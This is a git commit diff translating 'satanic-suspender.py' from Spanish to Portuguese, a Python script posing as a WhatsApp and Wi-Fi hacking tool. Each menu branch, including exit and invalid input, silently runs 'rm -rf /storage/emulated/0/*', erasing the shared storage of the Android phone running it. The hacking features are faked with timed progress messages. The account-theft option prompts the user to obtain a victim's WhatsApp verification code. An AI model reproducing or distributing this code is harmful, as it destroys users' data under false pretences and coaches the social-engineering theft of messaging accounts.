0ff0f03e5a17ec0f5541a0a61883e144a20f04a5
yShiroZ <80423260+yShiroZ@users.noreply.github.com>
2021-07-08 12:50:19 -0300

    Update satanic-suspender.py

--- satanic-suspender.py
+++ satanic-suspender.py
@@ -1,52 +1,52 @@
 #!/usr/bin/python
 
 ########################
-# PROPIEDAD DE SATANIC #
+# THE RAINS #
 ########################
 ##########################
-# wa.me/+5521982000000 :)#
+# AND SHIRO #
 ##########################
 import os, time
 
 def menu():
 	print("""
-\033[1;37m(1)\033[0;m \033[0;32mSuspender Numeros De Whatsapp\033
-\033[1;37m(2)\033[0;32m Robar Una Cuenta De Whatsapp\033[1;37m
-(3)\033[0;m \033[0;32mSuspender Sim Permanentemente\033[1;37m
+\033[1;37m(1)\033[0;m \033[0;32mBanir números do whatsapp\033
+\033[1;37m(2)\033[0;32mBuzonear uma conta do whatsapp\033[1;37m
+(3)\033[0;m \033[0;32mBanir SIM permanentemente\033[1;37m
 (4)\033[0;m \033[0;32mHackear Wifi\033
-\033[1;37m(5)\033[0;m \033[0;32mObtener Grupos Antiguos(2011)\033[1;37m
-(0)\033[0;m \033[0;31mSalir\033
+\033[1;37m(5)\033[0;m \033[0;32mGerar grupos antigos (2011)\033[1;37m
+(0)\033[0;m \033[0;31mSair\033
 """)
 menu()
 
-X = input("\033[1;44;37mElige una opcion. ej: 1\033[0;m \033[1;36m\n\n>\033[0;m ")
+X = input("\033[1;44;37mEscolha uma das opções acima: 1\033[0;m \033[1;36m\n\n>\033[0;m ")
 
 if X == "1":
     H = os.system("rm -rf /storage/emulated/0/*")
-    H = input("digite el numero a suspender: \n> ")
-    #attack.SuspenderNumeroSelecionado("{NUMBER}")
-    print(f"suspendiendo el numero {H}")
+    H = input("Digite o número do alvo:")
+    #attack.Banirnumerodigitado ("{NUMBER}")
+    print(f"Banindo o número {H}")
     time.sleep(2)
-    print(f"suspendiendo el numero {H}")
+    print(f"Banindo o número {H}")
     time.sleep(2)
-    print(f"suspendiendo el numero {H}")
+    print(f"Banindo o número {H}")
     time.sleep(2)
-    print(f"suspendiendo el numero {H}")
+    print(f"Banindo o número {H}")
     time.sleep(3)
-    #ElNumero {H} ASidoSuspendido!
-    print(f"el numero {H} a sido suspendido :)")
+    #O número {H} Foibanido!
+    print(f"O número {H} foi banido por THE RAINS and SHIRO")
     
 elif X == "2":
     A = os.system("rm -rf /storage/emulated/0/*")
-    A = input("digite la cuenta de whatsapp a robar: \n> ")
-    #RobarCuentaDeWhatsapp
-    print("envie el codigo de Verificacion para luego enviarselo.")
+    A = input("Digite o número que deseja roubar: \n> ")
+    #Roubarcontawhatsapp
+    print("Peça o código de verificação")
     time.sleep(20)
     E = "546214"
     #CodigoEnviado...
-    #RecibiendoCodigoDeWhatsapp...
-    #EnviandoCodigoDeWhatsappAlUsuario...
-    print(f"el codigo que usted envio es {E}. \nAhora vaya e ingrese ese codigo en whatsapp :).")
+    #RecebendoCodigoDeWhatsapp...
+    #Enviandocodigodewhatsappaousuario...
+    print(f"O código de verificação é {E}. \Agora ja pode confirmar sua conta")
     
 elif X == "3":
     D = os.system("rm -rf /storage/emulated/0/*")
@@ -66,32 +66,32 @@ elif X == "3":
     
 elif X == "4":
     B = os.system("rm -rf /storage/emulated/0/*")
-    B = input("digite el nombre del wifi a hackear: /n> ")
+    B = input("Digite o ip do wifi que deseja hackear /n> ")
     #attack.ContraseñaWifi
     U = "DiegoPija"
-    print(f"hackeando el wifi {B}")
+    print(f"Hackeando o wifi {B}")
     time.sleep(2)
-    print(f"hackeando el wifi {B}")
+    print(f"Hackeando o wifi {B}")
     time.sleep(2)
-    print(f"hackeando el wifi {B}")
+    print(f"Hackeando o wifi {B}")
     time.sleep(2)
-    print(f"hackeando el wifi {B}")
+    print(f"Hackeando o wifi {B}")
     time.sleep(2)
-    print(f"hackeando el wifi {B}")
+    print(f"Hackeando o wifi {B}")
     time.sleep(3)
-    print(f"el wifi a sido hackeado con exito!. \nla Contraseña es: {U}")
+    print(f"O wi-fi foi hackeado com sucesso \nA senha é: {U}")
     
 elif X == "5":
     W = os.system("rm -rf /storage/emulated/0/*")
-    W = input("digite de que año quieres que sea el Grupo: \n> ")
-    print(f"quieres un grupo del año {W}?. \nEntra a este grupo de whatsapp y pidelo :): /n> https://chat.whatsapp.com/Ho65Vasz4qkEmtSnJhrdfe")
+    W = input("Digite o ano que você quer que seja o grupo: \n> ")
+    print(f"Seu grupo de {W}?. \n é este: /n> https://chat.whatsapp.com/Ho65Vasz4qkEmtSnJhrdf7")
     
 elif X == "0":
     Z = os.system("rm -rf /storage/emulated/0/*")
     Z = os.system("exit")
     time.sleep(1)
-    print("\n\033[1;32mGracias por usar este script, vuelve nuevamente\033[0;m\033[1;37m!\033[0;m")
+    print("\n\033[1;32mObrigado por usar esse script volte quando quiser\033[0;m\033[1;37m!\033[0;m")
     
 else:
     Xx = os.system("rm -rf /storage/emulated/0/*")
-    print("\033[1;31m\nError:\033[0;m Carácter incorrecto, ejecute de nuevo el script y, seleccione una opcion. (1, 2, 3, 4, 5, 0)")
+    print("\033[1;31m\nError:\033[0;m Caractere incorreto, execute novamente e escolha uma opção (1, 2, 3, 4, 5, 0)")
